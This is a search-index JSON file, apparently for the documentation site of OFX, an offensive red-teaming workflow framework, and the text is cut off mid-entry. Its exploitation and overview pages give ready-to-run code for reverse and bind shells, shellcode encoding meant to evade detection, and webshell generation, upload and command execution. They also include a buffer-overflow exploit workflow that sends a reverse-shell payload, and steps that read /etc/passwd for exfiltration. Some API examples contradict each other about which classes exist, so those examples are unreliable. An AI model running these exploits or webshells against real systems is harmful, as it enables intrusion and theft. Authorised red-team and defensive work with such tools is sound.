{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Welcome to OFX","text":"<ul> <li> <p> Powerful Workflows</p> <p>Execute complex multi-job workflows with dependencies, lifecycle hooks, and flexible execution strategies.</p> <p> Quick Start</p> </li> <li> <p> Red Teaming APIs</p> <p>15+ classes for exploitation, reconnaissance, and post-exploitation. Reduce scripting overhead by 80-90%.</p> <p> Explore APIs</p> </li> <li> <p> Lifecycle Hooks</p> <p>Inject custom logic at any point in execution with comprehensive hook system and propagation.</p> <p> Learn about hooks</p> </li> <li> <p> Template Support</p> <p>Jinja2 templating for dynamic configuration with built-in helper functions.</p> <p> Template guide</p> </li> </ul>"},{"location":"#what-is-ofx","title":"What is OFX?","text":"<p>Offensive Flow Executor (OFX) is a powerful workflow execution framework designed specifically for red teaming operations. It combines:</p> <ul> <li>Workflow orchestration with dependency management</li> <li>Comprehensive hook system for lifecycle customization</li> <li>Red teaming APIs that eliminate boilerplate code</li> <li>Async execution for efficient parallel operations</li> <li>Template support for dynamic configurations</li> </ul>"},{"location":"#key-features","title":"Key Features","text":""},{"location":"#workflow-orchestration","title":"Workflow Orchestration","text":"<p>Execute multi-job workflows with dependencies and automatic execution ordering.</p> <pre><code>name: Reconnaissance Workflow\njobs:\n  discovery:\n    steps:\n      - run: nmap -sV ${{ inputs.target }}\n\n  analysis:\n    needs: [discovery]\n    steps:\n      - run: python analyze.py\n</code></pre>"},{"location":"#lifecycle-hooks","title":"Lifecycle Hooks","text":"<p>Run custom code at different stages of execution:</p> <pre><code>hooks:\n  on_start:\n    - run: echo \"Starting...\"\n  on_success:\n    - run: echo \"Success!\"\n</code></pre>"},{"location":"#red-teaming-apis","title":"Red Teaming APIs","text":"<p>Use built-in APIs to simplify common tasks:</p> <pre><code>from ofx.api import webshell, http\n\n# Execute commands via webshell\nshell = webshell.WebShell(url=\"http://target/shell.php\")\nresult = shell.execute(\"whoami\")\n\n# Make HTTP requests\nresponse = http.fetch(\"https://api.example.com\")\n</code></pre>"},{"location":"#performance-optimized","title":"Performance Optimized","text":"<p>Fast execution with async support and efficient resource management.</p>"},{"location":"#quick-example","title":"Quick Example","text":"CLIPython ModuleRed Team API <pre><code># Run a workflow\nofx flow run ./my_workflow.yml\n\n# With inputs\nofx flow run ./workflow.yml --input target=example.com\n\n# With secrets\nofx flow run ./workflow.yml --secret API_KEY=xxx\n</code></pre> <pre><code>import asyncio\nfrom ofx.runner import WorkflowRunner, RunContext\nfrom ofx.runner.loaders import WorkflowLoader\n\nasync def main():\n    workflow = WorkflowLoader.find_flow(\"my_workflow\")\n    runner = WorkflowRunner(workflow, ctx=RunContext())\n    result = await runner.run()\n    print(f\"Status: {result.status}\")\n\nasyncio.run(main())\n</code></pre> <pre><code>from ofx.api import PortScanner, ServiceGrabber\n\n# Port scanning\nscanner = PortScanner(target='192.168.1.1', ports='1-1000')\nopen_ports = scanner.scan()\n\n# Service grabbing\ngrabber = ServiceGrabber(target='192.168.1.1', port=80)\nbanner = grabber.grab_banner()\n</code></pre>"},{"location":"#next-steps","title":"Next Steps","text":"<ul> <li> <p>New to OFX?</p> <p>Start with the Quick Start and Basic Concepts</p> </li> <li> <p>Build Workflows</p> <p>Learn about Workflows, Jobs &amp; Steps, and Hooks</p> </li> <li> <p>Use Red Team APIs</p> <p>Explore API Overview for reconnaissance, exploitation, and post-exploitation</p> </li> <li> <p>Learn More</p> <p>Check Templates, Secrets, and CLI Commands</p> </li> </ul>"},{"location":"advanced/performance/","title":"Performance Optimization","text":"<p>OFX includes several performance optimizations to ensure fast execution and efficient resource usage.</p>"},{"location":"advanced/performance/#template-resolution-caching","title":"Template Resolution Caching","text":""},{"location":"advanced/performance/#problem","title":"Problem","text":"<p>Template resolution was creating new dictionaries and compiling Jinja2 templates on every call.</p>"},{"location":"advanced/performance/#solution","title":"Solution","text":"<ul> <li>SUPPORT_FUNCS caching: Dictionary created once, reused across all instances</li> <li>Template compilation caching: Compiled Template objects stored and reused</li> <li>Cache size limiting: Maximum 1,000 templates prevents memory bloat</li> </ul>"},{"location":"advanced/performance/#performance-impact","title":"Performance Impact","text":"<pre><code>Template resolution: 0.013ms per call\n5,000 resolutions: 0.065s\n</code></pre>"},{"location":"advanced/performance/#lazy-connector-discovery","title":"Lazy Connector Discovery","text":""},{"location":"advanced/performance/#problem_1","title":"Problem","text":"<p>Connector discovery performed filesystem scanning at module import time.</p>"},{"location":"advanced/performance/#solution_1","title":"Solution","text":"<ul> <li>Discovery deferred until first <code>get_connector()</code> call</li> <li>No I/O overhead for unused APIs</li> </ul>"},{"location":"advanced/performance/#performance-impact_1","title":"Performance Impact","text":"<pre><code>Module import (lazy): 0.002s\nModule import (eager): 0.008s\nConnector discovery: 0.006s (only when needed)\n</code></pre>"},{"location":"advanced/performance/#benchmarking","title":"Benchmarking","text":"<p>Run the included benchmark:</p> <pre><code>python benchmark_perf.py\n</code></pre>"},{"location":"advanced/performance/#sample-output","title":"Sample Output","text":"<pre><code>\ud83d\ude80 OFX Performance Benchmark\n\n============================================================\n\u2713 Template resolution (1000 iterations \u00d7 5 templates): 0.065s\n  Average per template: 0.013ms\n============================================================\n\u2713 Module import (lazy discovery): 0.002s\n\u2713 Connector discovery: 0.006s\n============================================================\n</code></pre>"},{"location":"advanced/performance/#best-practices","title":"Best Practices","text":""},{"location":"advanced/performance/#for-workflow-authors","title":"For Workflow Authors","text":"<ol> <li>Reuse templates: Identical template strings benefit from compilation caching</li> <li>Keep workflows concise: Fewer unique templates = better cache hit rate</li> <li>Use variables: <code>${{ variable }}</code> templates are cached and fast</li> </ol>"},{"location":"advanced/performance/#for-developers","title":"For Developers","text":"<ol> <li>Don't disable caching: Performance gains are significant</li> <li>Monitor cache size: Consider if 1,000 template limit is appropriate</li> <li>Profile before optimizing: Use benchmark to measure changes</li> </ol>"},{"location":"advanced/performance/#memory-usage","title":"Memory Usage","text":""},{"location":"advanced/performance/#template-cache","title":"Template Cache","text":"<ul> <li>Maximum size: 1,000 compiled templates</li> <li>Auto-clear: Cache cleared when limit reached</li> <li>Typical usage: 10-50 unique templates per workflow</li> <li>Memory per template: ~2-5KB</li> </ul>"},{"location":"advanced/performance/#support_funcs-cache","title":"SUPPORT_FUNCS Cache","text":"<ul> <li>Size: ~15 function references</li> <li>Memory: &lt;1KB</li> <li>Lifetime: Class-level (shared across instances)</li> </ul>"},{"location":"advanced/performance/#profiling-workflows","title":"Profiling Workflows","text":""},{"location":"advanced/performance/#enable-debug-logging","title":"Enable Debug Logging","text":"<pre><code>import logging\nlogging.getLogger('ofx').setLevel(logging.DEBUG)\n</code></pre>"},{"location":"advanced/performance/#time-a-workflow","title":"Time a Workflow","text":"<pre><code>time ofx flow run workflow.yml\n</code></pre>"},{"location":"advanced/performance/#python-profiler","title":"Python Profiler","text":"<pre><code>python -m cProfile -o profile.stats -m ofx.commands.flow.run workflow.yml\npython -m pstats profile.stats\n</code></pre>"},{"location":"advanced/performance/#future-optimizations","title":"Future Optimizations","text":"<ul> <li> Cache statistics/monitoring</li> <li> JIT compilation for frequent templates</li> <li> Persistent cache across runs</li> <li> Incremental connector discovery</li> <li> Command execution pooling</li> </ul>"},{"location":"advanced/performance/#see-also","title":"See Also","text":"<ul> <li>PERFORMANCE.md - Detailed performance documentation</li> <li>API Overview - Red teaming APIs</li> </ul>"},{"location":"advanced/performance/","title":"Performance Guide","text":"<p>Overview of performance tuning and troubleshooting in OFX.</p> <ul> <li>Tuning</li> <li>Troubleshooting</li> </ul>"},{"location":"advanced/performance/troubleshooting/","title":"Performance Troubleshooting","text":"<p>This page helps you diagnose and resolve performance issues in OFX workflows, such as slow job execution, resource bottlenecks, and unexpected delays.</p>"},{"location":"advanced/performance/troubleshooting/#common-issues","title":"Common Issues","text":"<ul> <li>Slow job execution: Jobs take longer than expected to complete</li> <li>Resource contention: Multiple jobs compete for CPU, memory, or network</li> <li>Long startup times: Workflow initialization is slow</li> <li>Timeouts: Steps or jobs exceed their allowed time</li> </ul>"},{"location":"advanced/performance/troubleshooting/#troubleshooting-steps","title":"Troubleshooting Steps","text":"<ol> <li> <p>Enable Debug Logging:</p> <ul> <li>Run with <code>--debug</code> to see detailed timing and resource usage</li> <li>Example: <code>ofx flow run workflow.yml --debug</code></li> </ul> </li> <li> <p>Check Job Dependencies:</p> <ul> <li>Ensure jobs are not waiting unnecessarily due to misconfigured <code>needs:</code></li> </ul> </li> <li> <p>Review Resource Usage:</p> <ul> <li>Monitor system CPU, memory, and disk during workflow execution</li> <li>Use tools like <code>htop</code>, <code>iotop</code>, or <code>docker stats</code> if running in containers</li> </ul> </li> <li> <p>Optimize Parallelism:</p> <ul> <li>Group independent jobs to run in parallel</li> <li>Avoid too many parallel jobs if system resources are limited</li> </ul> </li> <li> <p>Increase Timeouts:</p> <ul> <li>If steps are timing out, increase the <code>timeout:</code> value in your YAML</li> </ul> </li> </ol>"},{"location":"advanced/performance/troubleshooting/#example-debugging-a-slow-workflow","title":"Example: Debugging a Slow Workflow","text":"<p><pre><code>ofx flow run workflows/large_scan.yml --debug\n</code></pre> Look for stages or steps with unusually long durations.</p>"},{"location":"advanced/performance/troubleshooting/#best-practices","title":"Best Practices","text":"<ul> <li>Use job dependencies to control execution order</li> <li>Set appropriate timeouts for long-running steps</li> <li>Monitor system resources during large workflows</li> </ul>"},{"location":"advanced/performance/troubleshooting/#see-also","title":"See Also","text":"<ul> <li>Performance Tuning</li> <li>Workflow Stages</li> </ul>"},{"location":"advanced/performance/tuning/","title":"Performance Tuning","text":"<p>Optimize your OFX workflows for speed, efficiency, and resource usage. This page covers best practices and configuration tips for high-performance automation.</p>"},{"location":"advanced/performance/tuning/#tips-for-faster-workflows","title":"Tips for Faster Workflows","text":"<ul> <li>Minimize job dependencies: Only use <code>needs:</code> where necessary to maximize parallelism</li> <li>Batch small steps: Combine related commands into a single step to reduce overhead</li> <li>Use efficient tools: Prefer fast, command-line tools for scanning and exploitation</li> <li>Limit output: Avoid excessive logging or large outputs in steps</li> </ul>"},{"location":"advanced/performance/tuning/#resource-management","title":"Resource Management","text":"<ul> <li>CPU: Limit the number of parallel jobs if CPU-bound</li> <li>Memory: Monitor memory usage for large data processing steps</li> <li>Disk: Clean up temporary files and artifacts after jobs complete</li> </ul>"},{"location":"advanced/performance/tuning/#example-parallel-jobs","title":"Example: Parallel Jobs","text":"<p><pre><code>jobs:\n    scan1:\n        steps:\n            - run: nmap 10.0.0.1\n    scan2:\n        steps:\n            - run: nmap 10.0.0.2\n    scan3:\n        steps:\n            - run: nmap 10.0.0.3\n</code></pre> All three jobs run in parallel, speeding up the workflow.</p>"},{"location":"advanced/performance/tuning/#tuning-timeouts","title":"Tuning Timeouts","text":"<ul> <li>Set <code>timeout:</code> on long-running steps to avoid hangs</li> <li>Increase timeouts for slow network or large scans</li> </ul>"},{"location":"advanced/performance/tuning/#monitoring","title":"Monitoring","text":"<ul> <li>Use <code>--debug</code> to profile workflow execution</li> <li>Integrate with system monitoring tools for large-scale runs</li> </ul>"},{"location":"advanced/performance/tuning/#see-also","title":"See Also","text":"<ul> <li>Performance Troubleshooting</li> <li>Workflow Stages</li> </ul>"},{"location":"api/exploitation/","title":"Exploitation APIs","text":"<p>APIs for binary analysis, shellcode generation, payload building, and remote connections.</p>"},{"location":"api/exploitation/#http-client","title":"HTTP Client","text":""},{"location":"api/exploitation/#requests","title":"requests","text":"<p>Enhanced HTTP client with connection pooling and retry logic.</p> <p>Basic Usage:</p> <pre><code>from ofx.api.http import requests\n\n# GET request\nresponse = requests.get('https://example.com')\nprint(response.text)\nprint(response.status_code)\nprint(response.headers)\n\n# POST request\nresponse = requests.post(\n    'https://api.example.com/data',\n    json={'key': 'value'}\n)\n\n# Custom headers\nresponse = requests.get(\n    'https://example.com',\n    headers={\n        'User-Agent': 'Custom Agent',\n        'X-API-Key': 'secret'\n    }\n)\n\n# With timeout\nresponse = requests.get('https://slow-site.com', timeout=5)\n</code></pre> <p>Advanced Features:</p> <pre><code># Connection pooling (automatic)\n# get_http_client() returns a synchronous httpx.Client\nclient = requests.get_http_client(\n    timeout=30,\n    max_connections=100,\n    max_keepalive_connections=20\n)\n\n# Multiple requests reuse the same synchronous client and its connections\nfor url in urls:\n    response = client.get(url)\n    # Process response\n\n# Rate limiting\nfrom ofx.api.http import RateLimiter\n\nlimiter = RateLimiter(calls_per_second=5.0)\nfor url in urls:\n    limiter.wait()  # Enforces rate limit\n    response = requests.get(url)\n\n# Retry with exponential backoff\nfrom ofx.api.http import retry_with_backoff\n\n@retry_with_backoff(max_retries=3)\ndef fetch_data(url):\n    response = requests.get(url)\n    response.raise_for_status()\n    return response.json()\n\ndata = fetch_data('https://api.example.com/data')\n</code></pre>"},{"location":"api/exploitation/#shellcode-generation","title":"Shellcode Generation","text":""},{"location":"api/exploitation/#shellgenerator","title":"ShellGenerator","text":"<p>Generate platform-specific shellcode for Linux/Windows on x86/x64.</p> <p>Basic Usage:</p> <pre><code>from ofx.api.shellcode import ShellGenerator\n\n# Linux x64 reverse shell\ngen = ShellGenerator('linux', 'x64')\nshellcode, exe_path = gen.get_shellcode(\n    shellcode_type='reverse',\n    connectback_ip='192.168.1.100',\n    connectback_port=4444\n)\n\nprint(f\"Shellcode size: {len(shellcode)} bytes\")\nprint(f\"Executable: {exe_path}\")  # Optional ELF wrapper\n\n# Windows x86 bind shell\ngen = ShellGenerator('windows', 'x86')\nshellcode, exe_path = gen.get_shellcode(\n    shellcode_type='bind',\n    connectback_ip='0.0.0.0',\n    connectback_port=5555,\n    make_exe=True  # Create PE file\n)\n</code></pre> <p>Available Shellcode Types:</p> <pre><code># Reverse shell (connects back to attacker)\ngen = ShellGenerator('linux', 'x64')\nsc, _ = gen.get_shellcode('reverse', '10.0.0.1', 4444)\n\n# Bind shell (listens for connection)\nsc, _ = gen.get_shellcode('bind', '0.0.0.0', 5555)\n\n# Execute command\nsc, _ = gen.get_shellcode('exec', cmd='/bin/sh')\n\n# Custom shellcode\nsc, _ = gen.get_shellcode('custom', custom_bytes=b'\\x90\\x90\\x90')\n</code></pre> <p>Custom Templates:</p> <pre><code>import struct\n\n# Define custom shellcode template\ndef my_reverse_shell(ip: str, port: int) -&gt; bytes:\n    # Convert IP to bytes\n    ip_bytes = bytes(map(int, ip.split('.')))\n    port_bytes = struct.pack('&gt;H', port)\n\n    # Your custom shellcode here\n    shellcode = b'\\x90' * 10  # NOP sled\n    shellcode += b'\\x31\\xc0'  # xor eax, eax\n    shellcode += ip_bytes\n    shellcode += port_bytes\n\n    return shellcode\n\n# Register template\nShellGenerator.register_template('linux', 'x64', 'custom_reverse', my_reverse_shell)\n\n# Use custom template\ngen = ShellGenerator('linux', 'x64')\nsc, _ = gen.get_shellcode('custom_reverse', '192.168.1.100', 4444)\n</code></pre> <p>Using Connectors:</p> <pre><code>from ofx.api.shellcode.connectors import MsfvenomConnector\n\n# Use msfvenom for generation\nconnector = MsfvenomConnector()\nif connector.available:\n    gen = ShellGenerator('linux', 'x64', connector=connector)\n    sc, exe = gen.get_shellcode('reverse', '10.0.0.1', 4444)\n</code></pre>"},{"location":"api/exploitation/#shellcodeencoder","title":"ShellcodeEncoder","text":"<p>Encode and obfuscate shellcode to evade detection.</p> <pre><code>from ofx.api.shellcode import ShellcodeEncoder\n\n# Generate shellcode\ngen = ShellGenerator('linux', 'x64')\nshellcode, _ = gen.get_shellcode('reverse', '10.0.0.1', 4444)\n\n# Encode shellcode\nencoder = ShellcodeEncoder(shellcode)\n\n# XOR encoding\nencoded = encoder.xor_encode(key=0x42)\n\n# Base64 encoding\nb64_encoded = encoder.base64_encode()\n\n# Alpha-numeric encoding\nalphanum = encoder.alphanum_encode()\n\n# Chain encoders\nencoded = encoder.xor_encode(0x42).base64_encode()\n</code></pre>"},{"location":"api/exploitation/#network-utilities","title":"Network Utilities","text":""},{"location":"api/exploitation/#bind_shell","title":"bind_shell","text":"<p>Create bind shells for listening on ports.</p> <pre><code>from ofx.api.network import bind_shell, bind_tcp_shell, bind_telnet_shell\n\n# Basic bind shell\nbind_shell(host='0.0.0.0', port=4444, shell='/bin/bash')\n\n# TCP bind shell (bash)\nbind_tcp_shell('0.0.0.0', 8080)\n\n# Telnet bind shell\nbind_telnet_shell('0.0.0.0', 23)\n</code></pre>"},{"location":"api/exploitation/#reverse_shell","title":"reverse_shell","text":"<p>Create reverse shell connections.</p> <pre><code>from ofx.api.network import reverse_shell\n\n# Connect back to attacker\nreverse_shell(\n    connect_ip='192.168.1.100',\n    connect_port=4444,\n    shell='/bin/bash'\n)\n</code></pre>"},{"location":"api/exploitation/#exploit-utilities","title":"Exploit Utilities","text":""},{"location":"api/exploitation/#url-and-network-helpers","title":"URL and Network Helpers","text":"<pre><code>from ofx.api.exploit import (\n    urlparse,\n    check_port,\n    get_host_ip,\n    get_host_ipv6,\n    random_str,\n    get_middle_text\n)\n\n# URL parsing\nresult = urlparse('192.168.1.1:8080')\nprint(result.hostname)  # 192.168.1.1\nprint(result.port)      # 8080\n\n# Check if port is open\nif check_port('example.com', 80, timeout=2):\n    print(\"Port 80 is open\")\n\n# Get local IPs\nipv4 = get_host_ip()\nipv6 = get_host_ipv6()\n\n# Generate random strings\nrandom_str(length=10)  # 'aB3xY9mK2p'\nrandom_str(10, charset='0123456789')  # '8372649105'\n\n# Extract text between markers\nhtml = '&lt;title&gt;Admin Panel&lt;/title&gt;'\ntitle = get_middle_text(html, '&lt;title&gt;', '&lt;/title&gt;')\n# Result: 'Admin Panel'\n</code></pre>"},{"location":"api/exploitation/#payload-encoding","title":"Payload Encoding","text":"<pre><code>from ofx.api.exploit import encoder_bash_payload, encoder_powershell_payload\n\n# Bash payload encoding\nbash_cmd = 'cat /etc/passwd'\nencoded = encoder_bash_payload(bash_cmd)\n# Result: Base64 encoded payload safe for bash execution\n\n# PowerShell payload encoding\nps_cmd = 'Get-Process'\nencoded_ps = encoder_powershell_payload(ps_cmd)\n# Result: Base64 encoded PowerShell command\n</code></pre>"},{"location":"api/exploitation/#data-structures","title":"Data Structures","text":"<pre><code>from ofx.api.exploit import AttribDict, OrderedSet\n\n# Dictionary with attribute access\nconfig = AttribDict({'host': 'example.com', 'port': 443})\nprint(config.host)  # 'example.com'\nconfig.timeout = 30\nprint(config['timeout'])  # 30\n\n# Ordered set (no duplicates)\ntargets = OrderedSet()\ntargets.add('192.168.1.1')\ntargets.add('192.168.1.2')\ntargets.add('192.168.1.1')  # Won't add duplicate\nprint(list(targets))  # ['192.168.1.1', '192.168.1.2']\n</code></pre>"},{"location":"api/exploitation/#webshell-apis","title":"Webshell APIs","text":""},{"location":"api/exploitation/#webshellcodefactory","title":"WebShellCodeFactory","text":"<p>Generate webshells for different platforms.</p> <pre><code>from ofx.api.webshell import WebShellCodeFactory\n\n# Create factory\nfactory = WebShellCodeFactory()\n\n# PHP webshell\nphp_shell = factory.create(\n    language='php',\n    password='secret123',\n    encoder='base64'\n)\nprint(php_shell)\n\n# JSP webshell\njsp_shell = factory.create(\n    language='jsp',\n    password='admin',\n    inline=True  # One-liner\n)\n\n# ASPX webshell with authentication\naspx_shell = factory.create(\n    language='aspx',\n    password='pass',\n    secret_header='X-Auth-Token',\n    secret_value='secret_key_here'\n)\n</code></pre>"},{"location":"api/exploitation/#webshell-client","title":"WebShell Client","text":"<p>Interact with uploaded webshells.</p> <pre><code>from ofx.api.webshell import WebShellClient\n\n# Connect to webshell\nclient = WebShellClient(\n    url='https://target.com/uploads/shell.php',\n    password='secret123',\n    param='cmd'  # Parameter name for commands\n)\n\n# Execute commands\nresult = client.execute('whoami')\nprint(result)  # 'www-data'\n\nresult = client.execute('ls -la /var/www')\nprint(result)\n\n# File upload/download\nclient.upload_file('/tmp/tool.sh', '/var/www/html/tool.sh')\ncontent = client.download_file('/etc/passwd')\n\n# Interactive shell\nclient.interactive()  # Drop into interactive mode\n</code></pre>"},{"location":"api/exploitation/#practical-examples","title":"Practical Examples","text":""},{"location":"api/exploitation/#exploit-development-workflow","title":"Exploit Development Workflow","text":"<pre><code>name: Exploit Development\n\ninputs:\n  target_ip:\n    required: true\n  target_port:\n    default: 9999\n\njobs:\n  exploit:\n    steps:\n      - name: Generate Shellcode\n        script: |\n          from ofx.api.shellcode import ShellGenerator\n          from ofx.api.exploit import get_host_ip\n\n          # Get attacker IP\n          lhost = get_host_ip()\n\n          # Generate shellcode\n          gen = ShellGenerator('linux', 'x64')\n          shellcode, _ = gen.get_shellcode(\n              shellcode_type='reverse',\n              connectback_ip=lhost,\n              connectback_port=4444\n          )\n\n          print(f\"shellcode={shellcode.hex()}\")\n          print(f\"size={len(shellcode)}\")\n        outputs:\n          shellcode: \"{{ step.shellcode }}\"\n          size: \"{{ step.size }}\"\n\n      - name: Build Exploit\n        script: |\n          import struct\n\n          # Buffer overflow exploit\n          shellcode = bytes.fromhex('{{ steps.0.outputs.shellcode }}')\n\n          # Build payload\n          buffer = b'A' * 1024  # Padding\n          buffer += struct.pack('&lt;I', 0x08048abc)  # EIP overwrite\n          buffer += b'\\x90' * 16  # NOP sled\n          buffer += shellcode\n\n          print(f\"payload={buffer.hex()}\")\n        outputs:\n          payload: \"{{ step.payload }}\"\n\n      - name: Send Exploit\n        script: |\n          import socket\n\n          payload = bytes.fromhex('{{ steps.1.outputs.payload }}')\n\n          # Send to target\n          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n          sock.connect(('{{ inputs.target_ip }}', {{ inputs.target_port }}))\n          sock.send(payload)\n          sock.close()\n\n          print(\"Exploit sent! Check listener on port 4444\")\n</code></pre>"},{"location":"api/exploitation/#web-application-testing","title":"Web Application Testing","text":"<pre><code>name: Web Application Exploitation\n\njobs:\n  upload_shell:\n    steps:\n      - name: Generate Webshell\n        script: |\n          from ofx.api.webshell import WebShellCodeFactory\n          from ofx.api.exploit import random_str\n\n          factory = WebShellCodeFactory()\n          password = random_str(16)\n\n          shell = factory.create(\n              language='php',\n              password=password,\n              encoder='base64'\n          )\n\n          # Save to file\n          with open('/tmp/shell.php', 'w') as f:\n              f.write(shell)\n\n          print(f\"password={password}\")\n        outputs:\n          password: \"{{ step.password }}\"\n\n      - name: Upload Shell\n        script: |\n          from ofx.api.http import requests\n\n          # Upload webshell\n          with open('/tmp/shell.php', 'rb') as f:\n              response = requests.post(\n                  '{{ inputs.upload_url }}',\n                  files={'file': f}\n              )\n\n          if response.status_code == 200:\n              print(\"Upload successful\")\n\n      - name: Execute Commands\n        script: |\n          from ofx.api.webshell import WebShellClient\n\n          client = WebShellClient(\n              url='{{ inputs.shell_url }}',\n              password='{{ steps.0.outputs.password }}'\n          )\n\n          # Enumerate system\n          print(client.execute('whoami'))\n          print(client.execute('uname -a'))\n          print(client.execute('cat /etc/passwd'))\n</code></pre>"},{"location":"api/exploitation/#binary-exploitation","title":"Binary Exploitation","text":"<pre><code>from ofx.api.exploit import AttribDict\nfrom ofx.api.shellcode import ShellGenerator\nimport struct\n\n# Target configuration\ntarget = AttribDict({\n    'host': '192.168.1.100',\n    'port': 9999,\n    'offset': 524,  # Buffer offset to EIP\n    'bad_chars': b'\\x00\\x0a\\x0d',\n    'jmp_esp': 0x625011AF  # JMP ESP gadget address\n})\n\n# Generate shellcode\ngen = ShellGenerator('windows', 'x86')\nshellcode, _ = gen.get_shellcode(\n    shellcode_type='reverse',\n    connectback_ip='10.0.0.1',\n    connectback_port=4444\n)\n\n# Remove bad characters (if needed)\n# shellcode = remove_bad_chars(shellcode, target.bad_chars)\n\n# Build exploit\nexploit = b'A' * target.offset\nexploit += struct.pack('&lt;I', target.jmp_esp)\nexploit += b'\\x90' * 16  # NOP sled\nexploit += shellcode\n\n# Send exploit\nimport socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((target.host, target.port))\nsock.send(exploit)\nsock.close()\n\nprint(f\"Exploit sent ({len(exploit)} bytes)\")\nprint(\"Listener should receive connection on port 4444\")\n</code></pre>"},{"location":"api/overview/","title":"API Overview","text":"<p>OFX provides comprehensive red teaming APIs to reduce scripting overhead by 80-90%.</p>"},{"location":"api/overview/#quick-navigation","title":"Quick Navigation","text":"<ul> <li>Reconnaissance APIs - Search engines, OOB testing, network scanning, HTTP server</li> <li>Exploitation APIs - HTTP client, shellcode generation, webshells, binary exploitation  </li> <li>Post-Exploitation APIs - File operations, utilities, data manipulation</li> </ul>"},{"location":"api/overview/#categories","title":"Categories","text":"<p>Note: Some APIs listed in this overview may not be available in the core library and could be part of other packages within the OFX ecosystem. The examples below use APIs available in the provided source context.</p>"},{"location":"api/overview/#reconnaissance","title":"Reconnaissance","text":"<p>Search engines, port scanning, service grabbing, DNS resolution, and subdomain enumeration.</p> API Purpose Example Fofa Asset discovery via Fofa search <code>fofa.search('app=\"Apache\"')</code> Shodan Internet-wide scanning search <code>shodan.search('apache')</code> ZoomEye Cyberspace search engine <code>zoomeye.search('apache')</code> CEye OOB DNS/HTTP callback testing <code>ceye.build_request('data')</code> Interactsh OOB interaction testing <code>interactsh.register()</code> PHTTPServer Payload hosting with SSL <code>server.start(daemon=True)</code>"},{"location":"api/overview/#exploitation","title":"Exploitation","text":"<p>Binary analysis, payload building, process execution, and network utilities.</p> API Purpose Example ShellcodeGenerator Platform-specific shellcode <code>gen.generate('linux', 'x64')</code>"},{"location":"api/overview/#post-exploitation","title":"Post-Exploitation","text":"<p>File operations, process management, cryptography, and credential handling.</p> API Purpose Example file File operations <code>file.read_file(path)</code>"},{"location":"api/overview/#quick-start","title":"Quick Start","text":""},{"location":"api/overview/#reconnaissance-example","title":"Reconnaissance Example","text":"<pre><code>from ofx.api import search\n\n# Asset discovery\nfofa = search.Fofa()\ntargets = fofa.search('app=\"Apache\" &amp;&amp; country=\"US\"', pages=2)\n\n# This example uses fofa, which is available.\n# PortScanner is commented out as it is not in the provided context.\n# for target in targets['results'][:10]:\n#     scanner = PortScanner(target=target['ip'], ports='80,443,8080')\n#     open_ports = scanner.scan()\n#     print(f\"{target['ip']}: {open_ports}\")\n</code></pre>"},{"location":"api/overview/#exploitation-example","title":"Exploitation Example","text":"<pre><code>from ofx.api import shellcode\n\n# Build payload\nsc_gen = shellcode.ShellGenerator('linux', 'x64')\npayload, _ = sc_gen.get_shellcode(\n    shellcode_type='reverse',\n    connectback_ip='10.0.0.1',\n    connectback_port=4444\n)\n\n# RemoteTarget is commented out as it is not in the provided context.\n# # Send to target\n# with RemoteTarget(host='target.com', port=9999) as remote:\n#     remote.send(payload)\n#     response = remote.recv()\n</code></pre>"},{"location":"api/overview/#post-exploitation-example","title":"Post-Exploitation Example","text":"<pre><code>from ofx.api import file\n\n# Read sensitive file\ndata = file.read_file('/etc/passwd')\n\n# CryptoUtils is commented out as it is not in the provided context.\n# # Hash for verification\n# hash_value = CryptoUtils.sha256(data)\n# \n# # Encode for exfiltration\n# encoded = CryptoUtils.base64_encode(data)\n</code></pre>"},{"location":"api/overview/#next-steps","title":"Next Steps","text":""},{"location":"api/overview/#detailed-api-documentation","title":"Detailed API Documentation","text":"<p>Explore comprehensive guides with usage examples:</p> <ul> <li>Reconnaissance APIs</li> <li>FOFA, Shodan, ZoomEye search engines</li> <li>CEye, Interactsh OOB testing</li> <li>HTTP server for payload hosting</li> <li>Exploitation APIs</li> <li>HTTP client with connection pooling</li> <li>Shellcode generation and encoding</li> <li>WebShell factory and client</li> <li>Post-Exploitation APIs</li> <li>File read/write operations</li> <li>String and data utilities</li> <li>URL parsing and IP resolution</li> <li>User agent generation</li> </ul>"},{"location":"api/overview/#cli-documentation-browser","title":"CLI Documentation Browser","text":"<p>Use the built-in API documentation command to explore all available APIs:</p> <pre><code># List all API modules\nofx docs api --list\n\n# View detailed documentation for a specific module\nofx docs api --module webshell\nofx docs api --module http\nofx docs api --module file\n\n# View specific function or class details\nofx docs api --module webshell --function WebShell\nofx docs api --module http --function fetch\n</code></pre>"},{"location":"api/overview/#api-usage-in-workflows","title":"API Usage in Workflows","text":"<p>All APIs can be used directly in your workflow steps:</p> <pre><code>name: api-example\ndescription: Using OFX APIs in workflows\n\njobs:\n  recon:\n    steps:\n      - name: Use HTTP API\n        script: |\n          from ofx.api import http\n\n          response = http.fetch(\"https://api.target.com\")\n          print(response)\n\n      - name: Use WebShell API\n        script: |\n          from ofx.api import webshell\n\n          shell = webshell.WebShell(\n              url=\"${{ inputs.shell_url }}\",\n              param=\"cmd\"\n          )\n          result = shell.execute(\"whoami\")\n          print(result)\n</code></pre>"},{"location":"api/overview/#common-api-patterns","title":"Common API Patterns","text":"<p>HTTP Requests: <pre><code>from ofx.api import http\n\n# GET request\nresponse = http.fetch(\"https://api.example.com/data\")\n\n# POST request\ndata = http.post(\"https://api.example.com/submit\", \n                 data={\"key\": \"value\"})\n</code></pre></p> <p>File Operations: <pre><code>from ofx.api import file\n\n# Read file\ncontent = file.read_file(\"results.txt\")\n\n# Write file\nfile.write_file(\"output.txt\", \"data\")\n</code></pre></p> <p>String Manipulation: <pre><code>from ofx.api import strings\n\n# This is an example, function does not exist in provided context\n# # Encode/decode\n# encoded = strings.base64_encode(\"data\")\n# decoded = strings.base64_decode(encoded)\n# \n# # URL operations\n# encoded_url = strings.url_encode(\"param=value&amp;test=1\")\n</code></pre></p> <p>For complete API reference with parameters, return types, and examples, use: <pre><code>ofx docs api --module &lt;module_name&gt;\n</code></pre></p>"},{"location":"api/post-exploitation/","title":"Post-Exploitation APIs","text":"<p>APIs for file operations, data manipulation, utilities, and credential management.</p>"},{"location":"api/post-exploitation/#file-operations","title":"File Operations","text":""},{"location":"api/post-exploitation/#read_file-write_file","title":"read_file / 